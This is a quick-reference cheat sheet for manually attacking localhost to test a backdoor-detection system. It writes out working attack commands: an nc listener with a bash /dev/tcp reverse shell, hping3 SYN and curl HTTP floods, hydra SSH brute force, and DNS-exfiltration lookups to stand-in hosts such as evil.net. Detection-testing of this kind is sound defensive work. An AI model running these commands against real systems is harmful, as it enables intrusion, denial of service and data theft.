# Manual Attack Testing - Quick Reference Cheat Sheet

## 🚀 Quick Start

```bash
# Use the interactive script (easiest)
./scripts/quick_attack_test.sh

# Or choose specific attack
./scripts/quick_attack_test.sh portscan 127.0.0.1
./scripts/quick_attack_test.sh synflood 127.0.0.1
./scripts/quick_attack_test.sh all 127.0.0.1
```

---

## 📋 Common Manual Attacks

### 1️⃣ **Port Scan** (Easiest)
```bash
# Basic scan
nmap 127.0.0.1

# Full port scan
nmap -p- 127.0.0.1

# Aggressive scan
sudo nmap -A 127.0.0.1
```
**Expected Detection:** ✅ Suricata + ANN

---

### 2️⃣ **Reverse Shell** (High Detection)
```bash
# Terminal 1: Start listener
nc -lvp 4444

# Terminal 2: Connect (simulating backdoor)
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
```
**Expected Detection:** ✅ Host + Network + Hybrid

---

### 3️⃣ **SYN Flood** (Network Attack)
```bash
# 10-second flood
sudo hping3 -S -p 80 --flood 127.0.0.1 &
sleep 10
sudo killall hping3
```
**Expected Detection:** ✅ Suricata + ANN

---

### 4️⃣ **DNS Tunneling** (Stealth)
```bash
# Suspicious DNS queries
nslookup aGVsbG8ud29ybGQ.malicious.com
nslookup ZGF0YS5leGZpbA.evil.net
```
**Expected Detection:** ✅ ANN (pattern analysis)

---

### 5️⃣ **HTTP Flood** (DoS)
```bash
# 100 rapid requests
for i in {1..100}; do
    curl -s http://127.0.0.1 > /dev/null &
done
wait
```
**Expected Detection:** ✅ Suricata + ANN

---

### 6️⃣ **SSH Brute Force** (Authentication Attack)
```bash
# Create password list
echo -e "password\n123456\nadmin" > /tmp/pass.txt

# Brute force
hydra -l testuser -P /tmp/pass.txt ssh://127.0.0.1
```
**Expected Detection:** ✅ Suricata (SSH brute force signature)

---

## 🎯 Testing Workflow

### **Before Attack**
```bash
# 1. Start detection system
sudo python3 app.py

# 2. Open dashboard
firefox http://localhost:7000

# 3. Monitor logs (in another terminal)
tail -f /var/log/backdoor-detection/hybrid_live.log | grep MALICIOUS
```

### **During Attack**
```bash
# Perform your chosen attack
# Watch the dashboard and logs in real-time
```

### **After Attack**
```bash
# 1. Check if detected
grep MALICIOUS /var/log/backdoor-detection/hybrid_live.log

# 2. Record results
echo "$(date): Port Scan - Detected: Yes - Score: 0.85" >> test_results.txt

# 3. Clean up
sudo killall nmap hping3 nc hydra 2>/dev/null
```

---

## 📊 Detection Monitoring

### **Real-Time Log Watching**
```bash
# All detections
tail -f /var/log/backdoor-detection/hybrid_live.log

# Only MALICIOUS
tail -f /var/log/backdoor-detection/hybrid_live.log | grep --color MALICIOUS

# With timestamps
tail -f /var/log/backdoor-detection/hybrid_live.log | while read line; do
    echo "[$(date +%H:%M:%S)] $line"
done
```

### **Network Monitoring**
```bash
# Active connections
watch -n 1 'netstat -an | grep ESTABLISHED'

# Suspicious processes
watch -n 1 'ps aux | grep -E "(nc|bash.*tcp|python.*socket)" | grep -v grep'

# Network traffic
sudo tcpdump -i lo -n
```

---

## 🛡️ Safety Commands

### **Stop All Attacks**
```bash
# Kill attack tools
sudo killall nmap hping3 nc hydra curl wget 2>/dev/null

# Kill background jobs
jobs -l
kill %1 %2 %3

# Kill by pattern
pkill -f "bash -i"
pkill -f "python.*socket"
```

### **Check What's Running**
```bash
# List all your processes
ps aux | grep $USER

# Network connections
netstat -tulpn | grep LISTEN

# Background jobs
jobs -l
```

---

## 📝 Attack Testing Template

```bash
# Copy this template for each test
cat >> attack_test_log.txt << EOF
========================================
Date: $(date)
Attack Type: [Port Scan/Reverse Shell/etc]
Target: 127.0.0.1
Command: [exact command used]
Duration: [X seconds]

Results:
- Detected: [Yes/No]
- Detection Time: [X seconds]
- Confidence Score: [0.XX]
- Engine: [Suricata/ANN/Hybrid]

Notes:
[Any observations]
========================================
EOF
```

---

## 🎓 Attack Difficulty Levels

### **Beginner** (Start Here)
```bash
# 1. Port scan
nmap 127.0.0.1

# 2. HTTP flood
for i in {1..50}; do curl -s http://127.0.0.1 > /dev/null & done

# 3. DNS queries
nslookup suspicious.malicious.com
```

### **Intermediate**
```bash
# 1. Reverse shell
nc -lvp 4444 &
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1

# 2. SYN flood
sudo hping3 -S -p 80 --flood 127.0.0.1

# 3. SSH brute force
hydra -l user -P wordlist.txt ssh://127.0.0.1
```

### **Advanced**
```bash
# 1. Encrypted C2 communication
# 2. Polymorphic payloads
# 3. Slow HTTP attacks
# See MANUAL_ATTACK_TESTING.md for details
```

---

## 🔧 Required Tools

### **Install All Tools**
```bash
sudo apt update
sudo apt install -y \
    nmap \
    hping3 \
    netcat \
    hydra \
    curl \
    dnsutils
```

### **Check Installation**
```bash
# Verify tools are installed
command -v nmap && echo "✓ nmap installed"
command -v hping3 && echo "✓ hping3 installed"
command -v nc && echo "✓ netcat installed"
command -v hydra && echo "✓ hydra installed"
```

---

## 📈 Expected Detection Rates

| Attack Type | Detection Rate | Primary Engine |
|-------------|---------------|----------------|
| Port Scan | 95%+ | Suricata + ANN |
| Reverse Shell | 98%+ | Host + Hybrid |
| SYN Flood | 90%+ | Suricata + ANN |
| SSH Brute Force | 99%+ | Suricata |
| DNS Tunneling | 85%+ | ANN |
| HTTP Flood | 92%+ | Suricata + ANN |

---

## ⚠️ Important Reminders

### **Legal**
- ✅ Only test on systems you own
- ✅ Get written authorization
- ✅ Use isolated environments
- ❌ Never attack production systems
- ❌ Never attack systems you don't own

### **Safety**
- Always use `127.0.0.1` for initial testing
- Have a way to stop attacks quickly
- Monitor system resources
- Keep backups ready

### **Best Practices**
- Test one attack at a time
- Document everything
- Clean up after testing
- Review detection logs
- Tune thresholds based on results

---

## 🆘 Troubleshooting

### **Attack Not Detected**
```bash
# 1. Check if detection system is running
ps aux | grep python3 | grep app.py

# 2. Check if Suricata is running
sudo systemctl status suricata

# 3. Check logs are being written
ls -lh /var/log/backdoor-detection/

# 4. Lower detection threshold
# Edit .env: ALERT_THRESHOLD=0.5
```

### **Too Many False Positives**
```bash
# Increase threshold
# Edit .env: ALERT_THRESHOLD=0.8

# Or retrain with more benign data
```

### **System Overloaded**
```bash
# Stop attacks
sudo killall nmap hping3 nc hydra

# Restart detection system
sudo systemctl restart backdoor-detection
```

---

## 📚 More Information

- **Full Manual Testing Guide**: [MANUAL_ATTACK_TESTING.md](MANUAL_ATTACK_TESTING.md)
- **Automated Testing**: `scripts/attack_simulator.py`
- **Accuracy Measurement**: `scripts/measure_accuracy.py`
- **Production Guide**: [PRODUCTION_DEPLOYMENT.md](PRODUCTION_DEPLOYMENT.md)

---

## 🎯 Quick Commands Summary

```bash
# Interactive testing (recommended)
./scripts/quick_attack_test.sh

# Manual port scan
nmap -p- 127.0.0.1

# Manual reverse shell
nc -lvp 4444 &
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1

# Manual SYN flood
sudo hping3 -S -p 80 --flood 127.0.0.1

# Watch detections
tail -f /var/log/backdoor-detection/hybrid_live.log | grep MALICIOUS

# Stop everything
sudo killall nmap hping3 nc hydra
```

---

**Happy Testing! 🎯**

Remember: **Only attack systems you own or have permission to test!**
